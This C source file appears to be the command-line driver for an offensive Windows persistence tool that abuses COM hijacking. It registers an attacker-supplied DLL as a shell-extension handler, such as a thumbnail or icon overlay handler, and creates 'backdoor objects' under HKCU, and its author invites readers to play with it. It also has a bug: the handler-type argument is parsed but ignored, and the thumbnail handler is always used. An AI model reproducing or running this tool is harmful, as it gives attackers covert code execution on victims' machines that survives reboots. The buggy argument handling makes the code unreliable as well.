#include "reg.h"

/// <summary>
/// Confirmed this can create COM Hijack for extensions and this can create backdoor objects for persistence.
/// Going to do some code cleanup in the next two weeks and write details about how all this works. For those who
/// know whats going on, have fun and play with this, otherwise just wait two weeks and youll get everything you need :) 
/// 
/// (I am too excited so im making this public early.) 
/// </summary>
/// 



// <gpt4>
void print_usage() {
    wprintf(L"Usage: program <BYTE> -d <PATH_TO_DLL> [-e <EXTENSION>] [-h] [-help]\n");
    wprintf(L"BYTE:\n");
    wprintf(L"  1 -> ICON_OVERLAY\n");
    wprintf(L"  2 -> ICON_HANDLER\n");
    wprintf(L"  3 -> DROP_HANDLER\n");
    wprintf(L"  4 -> PROPERTY_SHEET_HANDLER\n");
    wprintf(L"  5 -> THUMBNAIL_IMAGE_HANDLER\n");
    wprintf(L"  6 -> INFOTIP_HANDLER\n");
    wprintf(L"  7 -> COPY_HOOK_HANDLER\n");
    wprintf(L"  8 -> DATA_HANDLER\n");
    wprintf(L"-d <PATH_TO_DLL>: Path to the DLL file.\n");
    wprintf(L"-e <EXTENSION>: File extension. Optional.\n");
    wprintf(L"-h: DLL hijack switch. Optional.\n");
    wprintf(L"-help: Print this help menu.\n");
}

int wmain(int argc, wchar_t* argv[]) {

    if (argc < 4) {
        print_usage();
        return 1;
    }

    int byte_value = _wtoi(argv[1]);

    WCHAR* path_to_dll = NULL;
    WCHAR* extension = NULL;
    BOOL hijack = false;

    for (int i = 2; i < argc; ++i) {
        if (wcscmp(argv[i], L"-d") == 0 && i + 1 < argc) {
            path_to_dll = argv[++i];
        }
        else if (wcscmp(argv[i], L"-e") == 0 && i + 1 < argc) {
            extension = argv[++i];
        }
        else if (wcscmp(argv[i], L"-h") == 0) {
            hijack = true;
        }
        else if (wcscmp(argv[i], L"-help") == 0) {
            print_usage();
            return 0;
        }
        else {
            wprintf(L"Unrecognized argument: %ls\n", argv[i]);
            return 1;
        }
    }

    if (path_to_dll == NULL) {
        wprintf(L"The '-d' argument is required.\n");
        return 1;
    }

    if (hijack) {

        reg::Hijack(THUMBNAIL_IMAGE_HANDLER, extension, path_to_dll);

    }
    else {

        GUID guid = reg::CreateBackdoorObj(HKCU, path_to_dll);
        reg::AddTechnique(THUMBNAIL_IMAGE_HANDLER, extension, guid);
    }

    return 0;
}

// </gpt4>